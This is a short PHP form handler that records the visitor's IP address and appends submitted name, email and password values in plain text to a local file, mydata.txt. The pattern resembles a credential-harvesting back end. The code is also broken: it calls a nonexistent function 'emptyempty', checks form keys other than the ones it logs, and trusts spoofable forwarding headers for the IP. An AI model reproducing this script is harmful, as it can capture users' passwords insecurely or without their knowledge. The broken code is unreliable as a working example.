<?php
function getIPAddress() {  
    //whether ip is from the share internet  
    if(!emptyempty($_SERVER['HTTP_CLIENT_IP'])) {  
                $ip = $_SERVER['HTTP_CLIENT_IP'];  
    }  
    //whether ip is from the proxy  
    elseif (!emptyempty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
    }  
    //whether ip is from the remote address  
    else{  
             $ip = $_SERVER['REMOTE_ADDR'];  
    }  
    return $ip;  
}

if(isset($_POST['name-9ee8']) && isset($_POST['email-9ee8']) && isset($_POST['message-9ee8'])) {
    $ip = getIPAddress();  
    $data = $_POST['name'] . ' ' . $_POST['email'] . ' ' . $_POST['password'] . ' ' . $ip . "\r\n";
    $ret = file_put_contents('mydata.txt', $data, FILE_APPEND | LOCK_EX);
    if($ret === false) {
        die('There was an error writing this file');
    }
    else {
        echo "$ret bytes written to file";
    }
}
else {
   die('no post data to process');
}
?>